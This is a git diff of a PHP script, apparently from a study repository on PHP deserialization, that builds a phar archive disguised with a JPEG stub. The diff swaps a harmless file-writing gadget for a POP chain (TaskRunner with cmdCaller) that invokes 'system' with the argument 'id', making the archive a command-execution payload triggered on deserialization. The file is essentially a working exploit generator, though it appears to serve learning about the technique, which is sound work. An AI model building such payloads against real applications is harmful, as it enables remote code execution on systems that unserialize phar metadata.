@@ -1,12 +1,12 @@
 <?php
+include '../external_class/cmd_runner.php';
+
 // Create the POP Chain
-class LogFile
-{
-    public function __construct(){
-        $this->filename = '/home/tsvetkoff/Programming/Github_repos/IppSec-PHP-Deserialization/file.txt';
-        $this->fcontents = 'it works!';
-    }
-}
+$runner = new TaskRunner();
+$runner->task = new cmdCaller();
+
+$runner->task->cmdName = "system";
+$runner->task->cmdArgs = "id";
 
 //Create the Phar Archice
 $phar = new \Phar("test.phar");
@@ -14,10 +14,10 @@ $phar->startBuffering();
 $phar->setStub(file_get_contents('image.jpg') . "<?php __HALT_COMPILER(); ?>");
 
 //Begin of serialization
-$payload = new LogFile();
-$phar->setMetadata($payload);
+$phar->setMetadata($runner);
 
 //Zip file within the Phar Archive
 $phar->addFromString("test.txt", "test");
 $phar->stopBuffering();
+
 ?>
